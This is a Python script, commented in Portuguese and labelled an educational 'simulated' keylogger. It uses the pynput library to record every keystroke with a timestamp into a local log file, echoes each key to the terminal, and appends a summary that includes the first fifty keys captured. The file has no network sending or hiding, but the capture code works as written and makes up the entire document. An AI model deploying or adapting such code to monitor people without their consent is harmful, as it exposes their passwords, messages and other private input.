#!/usr/bin/env python3
"""
Keylogger Simulado - Versao Basica
===================================

Este script implementa um keylogger simples que captura teclas pressionadas
e salva em arquivo de log. Utiliza a biblioteca pynput para monitoramento
de teclado.

AVISO: Este script e para fins EDUCACIONAIS apenas.
Nao use para espionagem ou fins maliciosos.

Uso:
    python keylogger_basic.py

Saidas:
    - Arquivo de log em logs/log_YYYY-MM-DD_HH-MM-SS.txt
    - Captura de teclas com timestamps
    - Parada com Ctrl+C
"""

import os
import sys
import time
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("[ERRO] Biblioteca 'pynput' nao encontrada.")
    print("Execute: pip install pynput")
    sys.exit(1)


class KeyloggerBasico:
    """Keylogger basico para fins educacionais."""

    def __init__(self):
        self.log_dir = Path(__file__).parent / "logs"
        self.log_dir.mkdir(exist_ok=True)
        
        # Cria arquivo de log com timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.log_file = self.log_dir / f"log_{timestamp}.txt"
        
        self.teclas_pressao = []
        self.tempo_inicio = datetime.now()
        
        # Contadores
        self.total_teclas = 0
        self.palavras_capturadas = 0

    def criar_cabecalho_log(self):
        """Cria cabecalho informativo no arquivo de log."""
        cabecalho = f"""
{'='*60}
  KEYLOGGER SIMULADO - Log de Captura
  [PROJETO DE ESTUDO - NAO USAR EM PRODUCAO]
{'='*60}

  Inicio da captura: {self.tempo_inicio.strftime('%d/%m/%Y %H:%M:%S')}
  Arquivo de log: {self.log_file.name}
  Diretorio: {self.log_file.parent}

{'='*60}

  TECLAS CAPTURADAS:
  (Pressione Ctrl+C para parar)

"""
        with open(self.log_file, "w", encoding="utf-8") as f:
            f.write(cabecalho)

    def ao_pressionar_tecla(self, tecla):
        """Callback chamado quando uma tecla e pressionada."""
        try:
            # Converte tecla para string
            tecla_str = self._formatar_tecla(tecla)
            
            # Registra timestamp
            timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            
            # Adiciona ao log
            log_entry = f"[{timestamp}] {tecla_str}\n"
            
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(log_entry)
            
            # Armazena em memoria para estatisticas
            self.teclas_pressao.append(tecla_str)
            self.total_teclas += 1
            
            # Mostra no terminal (modo debug)
            print(f"  Capturado: {tecla_str}")
            
            # Detecta fim de palavra (espaco ou Enter)
            if tecla_str in ["<espaco>", "<enter>"]:
                self.palavras_capturadas += 1
                
        except Exception as e:
            print(f"[ERRO] Falha ao processar tecla: {e}")

    def _formatar_tecla(self, tecla):
        """Formata a tecla para exibicao legivel."""
        try:
            # Teclas especiais
            if tecla == keyboard.Key.space:
                return "<espaco>"
            elif tecla == keyboard.Key.enter:
                return "<enter>"
            elif tecla == keyboard.Key.tab:
                return "<tab>"
            elif tecla == keyboard.Key.backspace:
                return "<backspace>"
            elif tecla == keyboard.Key.delete:
                return "<delete>"
            elif tecla == keyboard.Key.esc:
                return "<escape>"
            elif tecla == keyboard.Key.ctrl_l or tecla == keyboard.Key.ctrl_r:
                return "<ctrl>"
            elif tecla == keyboard.Key.alt_l or tecla == keyboard.Key.alt_r:
                return "<alt>"
            elif tecla == keyboard.Key.shift:
                return "<shift>"
            elif tecla == keyboard.Key.caps_lock:
                return "<caps_lock>"
            # Teclas de funcao
            elif hasattr(tecla, 'name') and tecla.name.startswith('f') and tecla.name[1:].isdigit():
                return f"<{tecla.name}>"
            # Caracteres normais
            elif hasattr(tecla, 'char') and tecla.char:
                return tecla.char
            else:
                return str(tecla)
        except:
            return str(tecla)

    def salvar_resumo(self):
        """Salva resumo da captura no final do log."""
        tempo_fim = datetime.now()
        duracao = tempo_fim - self.tempo_inicio
        
        resumo = f"""

{'='*60}
  RESUMO DA CAPTURA
{'='*60}

  Fim da captura: {tempo_fim.strftime('%d/%m/%Y %H:%M:%S')}
  Duracao total: {duracao}
  Total de teclas: {self.total_teclas}
  Palavras capturadas (aprox): {self.palavras_capturadas}

  Primeiras 50 teclas: {''.join(self.teclas_pressao[:50])}

{'='*60}
  [FIM DO LOG]
{'='*60}
"""
        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(resumo)
        
        print(f"\n[+] Resumo salvo em: {self.log_file}")

    def iniciar(self):
        """Inicia o keylogger."""
        print("=" * 60)
        print("  KEYLOGGER SIMULADO - Versao Basica")
        print("  [PROJETO DE ESTUDO - NAO USAR EM PRODUCAO]")
        print("=" * 60)
        print()
        print(f"[*] Log sera salvo em: {self.log_file}")
        print("[*] Pressione Ctrl+C para parar")
        print()
        
        # Cria cabecalho do log
        self.criar_cabecalho_log()
        
        try:
            # Inicia listener de teclado
            with keyboard.Listener(
                on_press=self.ao_pressionar_tecla
            ) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\n\n[*] Captura interrompida pelo usuario")
        finally:
            # Salva resumo
            self.salvar_resumo()
            print("[+] Keylogger finalizado")


def main():
    """Funcao principal."""
    keylogger = KeyloggerBasico()
    keylogger.iniciar()


if __name__ == "__main__":
    main()
